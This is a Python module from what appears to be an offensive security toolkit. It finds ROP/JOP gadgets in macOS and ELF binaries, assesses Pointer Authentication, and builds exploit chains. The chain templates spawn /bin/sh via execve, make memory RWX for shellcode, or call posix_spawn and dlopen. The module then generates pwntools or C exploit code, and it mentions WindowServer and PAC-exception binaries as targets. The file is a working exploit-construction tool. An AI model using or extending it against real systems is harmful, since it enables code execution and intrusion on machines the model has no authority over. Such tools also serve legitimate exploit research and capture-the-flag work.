"""cb gadget - ARM64 gadget finder and ROP chain builder for macOS binaries."""
import argparse
import os
import re
import subprocess
import sys

from cb.output import add_output_args, make_formatter
from cb.macho import get_entitlements, _run

# ---------------------------------------------------------------------------
# Pattern data: prefer external module, fall back to inline definitions
# ---------------------------------------------------------------------------
try:
    from cb.patterns.gadget_patterns import (
        ARM64_CLASSIFIERS, CHAIN_TEMPLATES,
        X86_64_CLASSIFIERS, CHAIN_TEMPLATES_X86_64,
    )
except ImportError:
    ARM64_CLASSIFIERS = {
        "stack_pivot": [
            r"mov\s+sp,\s*x\d+",
            r"add\s+sp,\s+sp,\s+#",
        ],
        "register_control": [
            r"ldp\s+x\d+.*\[sp",
            r"ldr\s+x0,\s*\[sp",
        ],
        "memory_write": [
            r"str\s+[xw]\d+,\s*\[[xw]\d+",
            r"stp\s+[xw]\d+",
        ],
        "memory_read": [
            r"ldr\s+[xw]\d+,\s*\[[xw]\d+",
        ],
        "syscall": [
            r"svc\s+#",
        ],
        "function_call": [
            r"blr\s+x\d+",
            r"br\s+x\d+",
        ],
    }

    X86_64_CLASSIFIERS = {
        "stack_pivot":      [r"xchg\s+.*rsp", r"mov\s+rsp,", r"leave"],
        "register_control": [r"pop\s+r(di|si|dx|cx|ax|8|9)", r"pop\s+rbp"],
        "memory_write":     [r"mov\s+.*\[r\w+\],\s*r\w+", r"mov\s+.*\[rsp"],
        "memory_read":      [r"mov\s+r\w+,\s*.*\[r\w+"],
        "syscall":          [r"syscall", r"int\s+0x80"],
        "function_call":    [r"call\s+r\w+", r"jmp\s+r\w+"],
    }

    CHAIN_TEMPLATES = {
        "execve": {
            "description": "execve('/bin/sh', NULL, NULL)",
            "needs": ["register_control", "syscall"],
            "registers": {
                "x0": "/bin/sh",
                "x1": "NULL",
                "x2": "NULL",
                "x16": "59",
            },
        },
        "mprotect_shellcode": {
            "description": "mprotect(addr, size, RWX) + jump to shellcode",
            "needs": ["register_control", "syscall", "stack_pivot"],
            "registers": {
                "x0": "page_addr",
                "x1": "0x4000",
                "x2": "7",
                "x16": "74",
            },
        },
        "posix_spawn": {
            "description": "posix_spawn to execute arbitrary binary",
            "needs": ["register_control", "function_call"],
            "call": "posix_spawn",
        },
        "dlopen_dlsym": {
            "description": "dlopen + dlsym to load and call arbitrary function",
            "needs": ["register_control", "function_call"],
            "call_sequence": ["dlopen", "dlsym", "blr"],
        },
    }

    CHAIN_TEMPLATES_X86_64 = {
        "execve": {
            "description": "execve('/bin/sh', NULL, NULL)",
            "needs": ["register_control", "syscall"],
            "registers": {"rdi": "/bin/sh", "rsi": "NULL", "rdx": "NULL", "rax": "59"},
        },
        "mprotect_shellcode": {
            "description": "mprotect(addr, size, RWX) + jump to shellcode",
            "needs": ["register_control", "syscall", "stack_pivot"],
            "registers": {"rdi": "page_addr", "rsi": "0x4000", "rdx": "7", "rax": "10"},
        },
        "dlopen_dlsym": {
            "description": "dlopen + dlsym to load and call arbitrary function",
            "needs": ["register_control", "function_call"],
            "call_sequence": ["dlopen", "dlsym", "call"],
        },
    }


# ---------------------------------------------------------------------------
# Compiled classifier regexes (built once at import time, keyed by arch)
# ---------------------------------------------------------------------------
_COMPILED_CLASSIFIERS = {
    "arm64": {
        category: [re.compile(pat, re.IGNORECASE) for pat in patterns]
        for category, patterns in ARM64_CLASSIFIERS.items()
    },
    "x86_64": {
        category: [re.compile(pat, re.IGNORECASE) for pat in patterns]
        for category, patterns in X86_64_CLASSIFIERS.items()
    },
}


# ===================================================================
# CLI registration
# ===================================================================

def register(subparsers):
    p = subparsers.add_parser("gadget",
                              help="ARM64 gadget finder and ROP chain builder")
    sub = p.add_subparsers(dest="gadget_command", help="Gadget subcommands")

    # --- find -----------------------------------------------------------
    s = sub.add_parser("find", help="Find ROP/JOP gadgets in a binary")
    s.add_argument("binary", help="Path to Mach-O or ELF binary")
    s.add_argument("--type",
                   choices=["stack_pivot", "register_control",
                            "memory_write", "syscall", "all"],
                   default="all",
                   help="Gadget category to search for (default: all)")
    s.add_argument("--depth", type=int, default=5,
                   help="Maximum instruction depth (default: 5)")
    s.add_argument("--arch", choices=["arm64", "x86_64", "auto"],
                   default="auto",
                   help="Target architecture (default: auto-detect)")
    add_output_args(s)

    # --- search ---------------------------------------------------------
    s = sub.add_parser("search",
                       help="Search gadgets matching a regex pattern")
    s.add_argument("binary", help="Path to Mach-O or ELF binary")
    s.add_argument("pattern", help="Regex pattern to match instructions")
    s.add_argument("--depth", type=int, default=5,
                   help="Maximum instruction depth (default: 5)")
    s.add_argument("--arch", choices=["arm64", "x86_64", "auto"],
                   default="auto",
                   help="Target architecture (default: auto-detect)")
    add_output_args(s)

    # --- chain ----------------------------------------------------------
    s = sub.add_parser("chain",
                       help="Build a ROP chain from a predefined template")
    s.add_argument("binary", help="Path to Mach-O binary")
    s.add_argument("--template", required=True,
                   choices=list(CHAIN_TEMPLATES.keys()),
                   help="Chain template to build")
    s.add_argument("--base-address", type=lambda x: int(x, 0), default=0,
                   help="Base address offset for ASLR slide (hex or int)")
    s.add_argument("--depth", type=int, default=5,
                   help="Gadget search depth (default: 5)")
    add_output_args(s)

    # --- multi ----------------------------------------------------------
    s = sub.add_parser("multi",
                       help="Search gadgets across multiple binaries")
    s.add_argument("binaries", nargs="+", help="Paths to Mach-O binaries")
    s.add_argument("--type",
                   choices=["stack_pivot", "register_control",
                            "memory_write", "syscall", "all"],
                   default="all",
                   help="Gadget category (default: all)")
    s.add_argument("--depth", type=int, default=5,
                   help="Maximum instruction depth (default: 5)")
    add_output_args(s)

    # --- pac-check ------------------------------------------------------
    s = sub.add_parser("pac-check",
                       help="Assess PAC (Pointer Authentication) status")
    s.add_argument("binary", help="Path to Mach-O binary")
    add_output_args(s)

    p.set_defaults(func=run)


# ===================================================================
# Top-level dispatcher
# ===================================================================

def run(args):
    out = make_formatter(args)

    cmd = getattr(args, "gadget_command", None)
    if not cmd:
        print("usage: cb gadget {find,search,chain,multi,pac-check} ...",
              file=sys.stderr)
        sys.exit(1)

    if cmd == "find":
        _run_find(args, out)
    elif cmd == "search":
        _run_search(args, out)
    elif cmd == "chain":
        _run_chain(args, out)
    elif cmd == "multi":
        _run_multi(args, out)
    elif cmd == "pac-check":
        _run_pac_check(args, out)
    else:
        print(f"Unknown gadget subcommand: {cmd}", file=sys.stderr)
        sys.exit(1)


# ===================================================================
# Subcommand handlers
# ===================================================================

def _detect_arch(binary):
    """Auto-detect architecture from a binary file."""
    try:
        with open(binary, "rb") as f:
            magic = f.read(4)
        # ELF magic
        if magic[:4] == b"\x7fELF":
            f2 = open(binary, "rb")
            f2.seek(18)  # e_machine offset
            machine = int.from_bytes(f2.read(2), "little")
            f2.close()
            if machine == 0x3E:  # EM_X86_64
                return "x86_64"
            if machine == 0xB7:  # EM_AARCH64
                return "arm64"
        # Mach-O magic
        if magic in (b"\xcf\xfa\xed\xfe", b"\xfe\xed\xfa\xcf"):
            f2 = open(binary, "rb")
            f2.seek(4)  # cputype offset
            cputype = int.from_bytes(f2.read(4), "little")
            f2.close()
            if cputype == 0x0100000C:  # CPU_TYPE_ARM64
                return "arm64"
            if cputype == 0x01000007:  # CPU_TYPE_X86_64
                return "x86_64"
    except (OSError, ValueError):
        pass
    return "arm64"


def _run_find(args, out):
    binary = args.binary
    gadget_type = getattr(args, "type", "all")
    depth = args.depth
    arch = getattr(args, "arch", "auto")
    if arch == "auto":
        arch = _detect_arch(binary)

    out.status(f"Searching gadgets in {os.path.basename(binary)} "
               f"(depth={depth}, type={gadget_type}, arch={arch})...")

    gadgets = find_gadgets(binary, depth=depth, gadget_type=gadget_type, arch=arch)
    gadgets = check_pac_compatibility(gadgets, binary)

    # Build category summary
    cat_counts = {}
    for g in gadgets:
        for c in g.get("categories", []):
            cat_counts[c] = cat_counts.get(c, 0) + 1

    result = {
        "binary": binary,
        "gadget_type": gadget_type,
        "depth": depth,
        "total_gadgets": len(gadgets),
        "category_counts": cat_counts,
        "gadgets": gadgets,
    }
    out.emit(result, "gadget")


def _run_search(args, out):
    binary = args.binary
    pattern = args.pattern
    depth = args.depth
    arch = getattr(args, "arch", "auto")
    if arch == "auto":
        arch = _detect_arch(binary)

    out.status(f"Searching gadgets matching /{pattern}/ in "
               f"{os.path.basename(binary)} (arch={arch})...")

    gadgets = search_gadgets(binary, pattern, depth=depth, arch=arch)

    result = {
        "binary": binary,
        "pattern": pattern,
        "depth": depth,
        "total_matches": len(gadgets),
        "gadgets": gadgets,
    }
    out.emit(result, "gadget")


def _run_chain(args, out):
    binary = args.binary
    template = args.template
    base_address = getattr(args, "base_address", 0)
    depth = args.depth

    out.status(f"Building {template} chain from "
               f"{os.path.basename(binary)}...")

    gadgets = find_gadgets(binary, depth=depth, gadget_type="all")
    gadgets = check_pac_compatibility(gadgets, binary)

    chain = build_chain(gadgets, template, binary, base_address=base_address)

    out.emit(chain, "gadget")


def _run_multi(args, out):
    binaries = args.binaries
    gadget_type = getattr(args, "type", "all")
    depth = args.depth

    out.status(f"Searching gadgets across {len(binaries)} binaries...")

    result = search_multi_binary(binaries, gadget_type=gadget_type,
                                 depth=depth)
    out.emit(result, "gadget")


def _run_pac_check(args, out):
    binary = args.binary
    out.status(f"Checking PAC status of {os.path.basename(binary)}...")

    result = check_pac(binary)
    out.emit(result, "gadget")


# ===================================================================
# Core functions
# ===================================================================

def find_gadgets(binary, depth=5, gadget_type="all", arch="arm64"):
    """Find ROP/JOP gadgets via ROPgadget and classify them.

    Parameters
    ----------
    binary : str
        Path to the binary.
    depth : int
        Maximum instruction depth for gadget search.
    gadget_type : str
        Category filter -- one of the classifier keys, or ``"all"``.
    arch : str
        Architecture: ``"arm64"`` or ``"x86_64"``.

    Returns
    -------
    list[dict]
        Each dict contains ``address``, ``instructions``, ``categories``,
        and ``pac_safe``.
    """
    cmd = ["ROPgadget", "--binary", binary, "--depth", str(depth), "--multibr"]
    try:
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        raw_output = proc.stdout
    except FileNotFoundError:
        # ROPgadget not installed -- return empty list with warning
        return []
    except subprocess.TimeoutExpired:
        return []

    gadgets = _parse_ropgadget_output(raw_output)

    # Classify each gadget
    for g in gadgets:
        g["categories"] = classify_gadget(g["instructions"], arch=arch)
        g["pac_safe"] = _is_pac_safe_instruction(g["instructions"])

    # Filter by requested type
    if gadget_type != "all":
        gadgets = [g for g in gadgets if gadget_type in g["categories"]]

    return gadgets


def _parse_ropgadget_output(raw_output):
    """Parse ROPgadget stdout into a list of gadget dicts.

    Expected line format::

        0x00001234 : mov x0, x1 ; ret
    """
    gadgets = []
    in_gadgets = False
    for line in raw_output.splitlines():
        line = line.strip()
        if not line:
            continue
        # ROPgadget prints "Gadgets information" header then
        # "============" separator before the actual gadgets.
        if line.startswith("Gadgets information"):
            in_gadgets = True
            continue
        if line.startswith("==="):
            continue
        if line.startswith("Unique gadgets"):
            # Footer line -- stop parsing
            break

        if not in_gadgets:
            continue

        # Parse: 0xADDR : instr ; instr ; ... ; ret
        m = re.match(r"(0x[0-9a-fA-F]+)\s*:\s*(.+)$", line)
        if m:
            address = m.group(1)
            instructions = m.group(2).strip()
            gadgets.append({
                "address": address,
                "instructions": instructions,
            })

    return gadgets


def classify_gadget(instruction_str, arch="arm64"):
    """Classify a gadget instruction string into zero or more categories.

    Parameters
    ----------
    instruction_str : str
        Semicolon-separated assembly instructions (e.g. ``"ldp x29, x30, [sp] ; ret"``).
    arch : str
        Architecture: ``"arm64"`` or ``"x86_64"``.

    Returns
    -------
    list[str]
        Matching category names from the arch-specific classifiers.
    """
    classifiers = _COMPILED_CLASSIFIERS.get(arch, _COMPILED_CLASSIFIERS["arm64"])
    categories = []
    for category, compiled_patterns in classifiers.items():
        for pat in compiled_patterns:
            if pat.search(instruction_str):
                categories.append(category)
                break  # one match per category is sufficient
    return categories


def _is_pac_safe_instruction(instruction_str):
    """Check whether the gadget ends with a plain ``ret`` (PAC-safe).

    Gadgets ending in ``retab`` or ``retaa`` use PAC-protected returns and
    are *not* usable in a classic ROP chain without PAC bypass.
    """
    # Normalise whitespace and grab the last instruction
    parts = [p.strip() for p in instruction_str.split(";")]
    if not parts:
        return False
    last = parts[-1].lower()
    # Plain "ret" is PAC-safe; retaa/retab are not
    if last == "ret":
        return True
    if re.match(r"ret\b(?!a|ab)", last):
        return True
    return False


def check_pac_compatibility(gadgets, binary):
    """Annotate gadgets with PAC-safety based on binary entitlements.

    If the binary carries the ``com.apple.private.pac.exception`` entitlement,
    PAC is disabled for that process and all gadgets are considered PAC-safe.

    Parameters
    ----------
    gadgets : list[dict]
        Gadget dicts (mutated in place).
    binary : str
        Path to the Mach-O binary.

    Returns
    -------
    list[dict]
        The same list, with ``pac_safe`` updated where appropriate.
    """
    pac_exception = _has_pac_exception(binary)
    if pac_exception:
        for g in gadgets:
            g["pac_safe"] = True
    return gadgets


def _has_pac_exception(binary):
    """Return *True* if binary has the PAC exception entitlement."""
    try:
        ents = get_entitlements(binary)
        if isinstance(ents, dict):
            return bool(ents.get("com.apple.private.pac.exception", False))
    except Exception:
        pass
    return False


def build_chain(gadgets, template, binary, base_address=0, arch="arm64"):
    """Build a ROP chain for a given template using available gadgets.

    Parameters
    ----------
    gadgets : list[dict]
        Pre-classified gadgets (output of :func:`find_gadgets`).
    template : str
        One of the keys in the chain templates for the target arch.
    binary : str
        Path to the binary (for metadata).
    base_address : int
        ASLR slide / base address offset to add to gadget addresses.
    arch : str
        Architecture: ``"arm64"`` or ``"x86_64"``.

    Returns
    -------
    dict
        Chain result with ``template``, ``complete``, ``missing``, ``chain``,
        and ``code`` keys.
    """
    templates = CHAIN_TEMPLATES_X86_64 if arch == "x86_64" else CHAIN_TEMPLATES
    tmpl = templates.get(template)
    if tmpl is None:
        return {
            "template": template,
            "complete": False,
            "error": f"Unknown template: {template}",
            "missing": [],
            "chain": [],
            "code": "",
        }

    needs = tmpl.get("needs", [])
    missing = []
    chain_steps = []
    step_num = 0

    # Index gadgets by category for fast lookup
    by_category = {}
    for g in gadgets:
        for cat in g.get("categories", []):
            by_category.setdefault(cat, []).append(g)

    # For each needed category, pick the best (shortest) PAC-safe gadget
    for need in needs:
        candidates = by_category.get(need, [])
        # Prefer PAC-safe gadgets, then shortest instruction count
        pac_safe = [c for c in candidates if c.get("pac_safe", False)]
        pool = pac_safe if pac_safe else candidates

        if not pool:
            missing.append(need)
            continue

        # Sort by instruction count (fewer is better)
        pool.sort(key=lambda g: len(g["instructions"].split(";")))
        best = pool[0]

        step_num += 1
        addr_int = int(best["address"], 16) + base_address
        chain_steps.append({
            "step": step_num,
            "gadget_address": hex(addr_int),
            "purpose": _purpose_for_need(need, tmpl),
            "instructions": best["instructions"],
            "category": need,
            "pac_safe": best.get("pac_safe", False),
        })

    complete = len(missing) == 0

    # Generate exploit code
    code = ""
    if chain_steps:
        code = generate_chain_code(chain_steps, fmt="python")

    return {
        "template": template,
        "description": tmpl.get("description", ""),
        "binary": binary,
        "base_address": hex(base_address),
        "complete": complete,
        "missing": missing,
        "chain": chain_steps,
        "code": code,
    }


def _purpose_for_need(need, tmpl):
    """Generate a human-readable purpose string for a chain step."""
    registers = tmpl.get("registers", {})
    call = tmpl.get("call", "")
    call_seq = tmpl.get("call_sequence", [])

    if need == "register_control":
        if registers:
            reg_summary = ", ".join(f"{k}={v}" for k, v in registers.items())
            return f"Set registers: {reg_summary}"
        return "Control registers for function arguments"
    elif need == "syscall":
        syscall_num = registers.get("x16", "?")
        return f"Trigger syscall (svc #0x80) with x16={syscall_num}"
    elif need == "stack_pivot":
        return "Pivot stack to controlled buffer"
    elif need == "function_call":
        if call:
            return f"Call {call}()"
        if call_seq:
            return f"Call sequence: {' -> '.join(call_seq)}"
        return "Branch to function via blr/br"
    elif need == "memory_write":
        return "Write value to memory"
    elif need == "memory_read":
        return "Read value from memory"
    else:
        return f"Provide {need} primitive"


def search_gadgets(binary, pattern, depth=5, arch="arm64"):
    """Search for gadgets whose instructions match a regex pattern.

    Parameters
    ----------
    binary : str
        Path to the binary.
    pattern : str
        Regex pattern to match against the instruction string.
    depth : int
        Maximum instruction depth.
    arch : str
        Architecture: ``"arm64"`` or ``"x86_64"``.

    Returns
    -------
    list[dict]
        Matching gadgets with classification and PAC annotations.
    """
    # Get all gadgets first, then filter
    all_gadgets = find_gadgets(binary, depth=depth, gadget_type="all", arch=arch)

    try:
        regex = re.compile(pattern, re.IGNORECASE)
    except re.error:
        return []

    matches = []
    for g in all_gadgets:
        if regex.search(g["instructions"]):
            matches.append(g)

    return matches


def search_multi_binary(binaries, gadget_type="all", depth=5):
    """Search gadgets across multiple binaries and aggregate results.

    This is useful when building chains from multiple loaded libraries
    (e.g. WindowServer + its dylibs).

    Parameters
    ----------
    binaries : list[str]
        Paths to Mach-O binaries.
    gadget_type : str
        Category filter.
    depth : int
        Instruction depth for ROPgadget.

    Returns
    -------
    dict
        Per-binary results and a combined ``best_gadgets`` mapping.
    """
    per_binary = {}
    all_gadgets_by_cat = {}

    for binary in binaries:
        basename = os.path.basename(binary)
        gadgets = find_gadgets(binary, depth=depth, gadget_type=gadget_type)
        gadgets = check_pac_compatibility(gadgets, binary)

        per_binary[basename] = {
            "path": binary,
            "total": len(gadgets),
            "gadgets": gadgets,
        }

        # Aggregate by category
        for g in gadgets:
            for cat in g.get("categories", []):
                entry = dict(g)
                entry["source_binary"] = basename
                all_gadgets_by_cat.setdefault(cat, []).append(entry)

    # Pick the best (shortest, PAC-safe) gadget per category
    best_gadgets = {}
    for cat, candidates in all_gadgets_by_cat.items():
        pac_safe = [c for c in candidates if c.get("pac_safe", False)]
        pool = pac_safe if pac_safe else candidates
        pool.sort(key=lambda g: len(g["instructions"].split(";")))
        if pool:
            best_gadgets[cat] = {
                "address": pool[0]["address"],
                "instructions": pool[0]["instructions"],
                "source_binary": pool[0].get("source_binary", ""),
                "pac_safe": pool[0].get("pac_safe", False),
            }

    # Category summary across all binaries
    cat_totals = {cat: len(gs) for cat, gs in all_gadgets_by_cat.items()}

    return {
        "binaries_searched": len(binaries),
        "gadget_type": gadget_type,
        "depth": depth,
        "category_totals": cat_totals,
        "best_gadgets": best_gadgets,
        "per_binary": per_binary,
    }


def check_pac(binary):
    """Assess PAC (Pointer Authentication Code) status of a binary.

    Parameters
    ----------
    binary : str
        Path to the Mach-O binary.

    Returns
    -------
    dict
        PAC assessment including entitlements, hardened runtime flags,
        detected PAC keys, and advisory notes.
    """
    pac_exception = _has_pac_exception(binary)
    hardened_runtime = _has_hardened_runtime(binary)
    pac_keys_used = _detect_pac_keys(binary)

    notes = []
    if pac_exception:
        notes.append(
            "Binary has com.apple.private.pac.exception -- "
            "PAC is DISABLED for this process. "
            "Classic ROP gadgets ending in plain ret are usable."
        )
    else:
        notes.append(
            "No PAC exception entitlement. "
            "Gadgets ending in retaa/retab require PAC bypass."
        )

    if hardened_runtime:
        notes.append(
            "Hardened runtime is enabled. "
            "Code injection requires entitlement exceptions or SIP bypass."
        )
    else:
        notes.append(
            "Hardened runtime is NOT enabled. "
            "DYLD_INSERT_LIBRARIES injection may be possible."
        )

    if pac_keys_used:
        notes.append(
            f"Detected PAC key usage: {', '.join(pac_keys_used)}. "
            f"Signed pointers in use."
        )
    else:
        notes.append(
            "No explicit PAC key instructions detected in disassembly."
        )

    # Well-known PAC exception binaries
    basename = os.path.basename(binary)
    known_pac_exceptions = [
        "ImageIOXPCService",
        "com.apple.ImageIOXPCService",
    ]
    if basename in known_pac_exceptions and not pac_exception:
        notes.append(
            f"Note: {basename} is a known PAC exception binary on some "
            f"macOS versions. Verify entitlements on your specific build."
        )

    return {
        "binary": binary,
        "binary_name": basename,
        "pac_exception": pac_exception,
        "hardened_runtime": hardened_runtime,
        "pac_keys_used": pac_keys_used,
        "notes": notes,
    }


def _has_hardened_runtime(binary):
    """Check whether the binary was signed with hardened runtime."""
    stdout, stderr = _run(["codesign", "-dvvv", binary])
    combined = stdout + stderr
    # codesign -dvvv shows "flags=0x10000(runtime)" for hardened runtime
    if "runtime" in combined.lower():
        return True
    if "flags=0x10000" in combined:
        return True
    return False


def _detect_pac_keys(binary):
    """Detect PAC instruction usage by scanning disassembly.

    Looks for PAC-specific ARM64e instructions in the binary text.
    """
    keys = set()

    # Use otool to get a quick disassembly sample
    stdout, stderr = _run(
        ["otool", "-tv", "-j", binary],
        timeout=60,
    )
    text = stdout if stdout else ""

    pac_instructions = {
        "pacia":  "IA",
        "pacib":  "IB",
        "pacda":  "DA",
        "pacdb":  "DB",
        "autia":  "IA",
        "autib":  "IB",
        "autda":  "DA",
        "autdb":  "DB",
        "retaa":  "IA",
        "retab":  "IB",
        "braa":   "IA",
        "brab":   "IB",
        "blraa":  "IA",
        "blrab":  "IB",
        "paciza": "IA",
        "pacizb": "IB",
        "pacdza": "DA",
        "pacdzb": "DB",
    }

    for line in text.splitlines():
        line_lower = line.strip().lower()
        for instr, key in pac_instructions.items():
            if instr in line_lower:
                keys.add(key)

    return sorted(keys)


def generate_chain_code(chain, fmt="python"):
    """Generate exploit code from an assembled chain.

    Parameters
    ----------
    chain : list[dict]
        Chain steps, each with ``gadget_address``, ``purpose``,
        ``instructions``.
    fmt : str
        Output format: ``"python"`` (pwntools) or ``"c"``.

    Returns
    -------
    str
        Formatted exploit code.
    """
    steps = chain.get("chain", []) if isinstance(chain, dict) else chain
    if fmt == "c":
        return _generate_c_code(steps)
    return _generate_python_code(steps)


def _generate_python_code(chain):
    """Generate pwntools-style Python exploit code."""
    lines = [
        "#!/usr/bin/env python3",
        '"""Auto-generated ROP chain -- catbyte-toolkit cb gadget"""',
        "from pwn import *",
        "",
        "# Adjust base for ASLR slide",
        "base = 0x0",
        "",
        "def build_chain(base=0x0):",
        '    """Build the ROP chain payload."""',
        "    chain = b''",
    ]

    for step in chain:
        addr = step["gadget_address"]
        purpose = step.get("purpose", "")
        instructions = step.get("instructions", "")
        lines.append(f"    # Step {step['step']}: {purpose}")
        lines.append(f"    # {instructions}")
        lines.append(f"    chain += p64(base + {addr})")
        lines.append("")

    lines.extend([
        "    return chain",
        "",
        "",
        "if __name__ == '__main__':",
        "    payload = build_chain(base)",
        "    print(f'Chain length: {len(payload)} bytes')",
        "    print(f'Gadgets: {len(payload) // 8}')",
        "    sys.stdout.buffer.write(payload)",
    ])

    return "\n".join(lines)


def _generate_c_code(chain):
    """Generate C-style exploit code."""
    lines = [
        "/* Auto-generated ROP chain -- catbyte-toolkit cb gadget */",
        "#include <stdint.h>",
        "#include <string.h>",
        "",
        "/* Adjust base for ASLR slide */",
        "static uint64_t base = 0x0;",
        "",
        "static void build_chain(uint8_t *buf, uint64_t base) {",
        "    uint64_t *p = (uint64_t *)buf;",
    ]

    for step in chain:
        addr = step["gadget_address"]
        purpose = step.get("purpose", "")
        instructions = step.get("instructions", "")
        idx = step["step"] - 1
        lines.append(f"    /* Step {step['step']}: {purpose} */")
        lines.append(f"    /* {instructions} */")
        lines.append(f"    p[{idx}] = base + {addr};")
        lines.append("")

    total = len(chain)
    lines.extend([
        "}",
        "",
        f"/* Total chain entries: {total} */",
        f"/* Required buffer size: {total * 8} bytes */",
    ])

    return "\n".join(lines)


# ===================================================================
# Standalone entry point
# ===================================================================

def main():
    """Entry point for the standalone ``cbgadget`` command."""
    parser = argparse.ArgumentParser(
        prog="cbgadget",
        description="ARM64 gadget finder and ROP chain builder",
    )
    sub = parser.add_subparsers(dest="gadget_command")

    # --- find -----------------------------------------------------------
    s = sub.add_parser("find", help="Find ROP/JOP gadgets")
    s.add_argument("binary", help="Path to Mach-O or ELF binary")
    s.add_argument("--type",
                   choices=["stack_pivot", "register_control",
                            "memory_write", "syscall", "all"],
                   default="all")
    s.add_argument("--depth", type=int, default=5)
    s.add_argument("--arch", choices=["arm64", "x86_64", "auto"], default="auto")
    add_output_args(s)

    # --- search ---------------------------------------------------------
    s = sub.add_parser("search", help="Search gadgets by regex")
    s.add_argument("binary", help="Path to Mach-O or ELF binary")
    s.add_argument("pattern", help="Regex pattern")
    s.add_argument("--depth", type=int, default=5)
    s.add_argument("--arch", choices=["arm64", "x86_64", "auto"], default="auto")
    add_output_args(s)

    # --- chain ----------------------------------------------------------
    s = sub.add_parser("chain", help="Build ROP chain from template")
    s.add_argument("binary", help="Path to Mach-O binary")
    s.add_argument("--template", required=True,
                   choices=list(CHAIN_TEMPLATES.keys()))
    s.add_argument("--base-address", type=lambda x: int(x, 0), default=0)
    s.add_argument("--depth", type=int, default=5)
    add_output_args(s)

    # --- multi ----------------------------------------------------------
    s = sub.add_parser("multi", help="Search across multiple binaries")
    s.add_argument("binaries", nargs="+")
    s.add_argument("--type",
                   choices=["stack_pivot", "register_control",
                            "memory_write", "syscall", "all"],
                   default="all")
    s.add_argument("--depth", type=int, default=5)
    add_output_args(s)

    # --- pac-check ------------------------------------------------------
    s = sub.add_parser("pac-check", help="Assess PAC status")
    s.add_argument("binary", help="Path to Mach-O binary")
    add_output_args(s)

    args = parser.parse_args()
    if not args.gadget_command:
        parser.print_help()
        sys.exit(1)
    run(args)


if __name__ == "__main__":
    main()
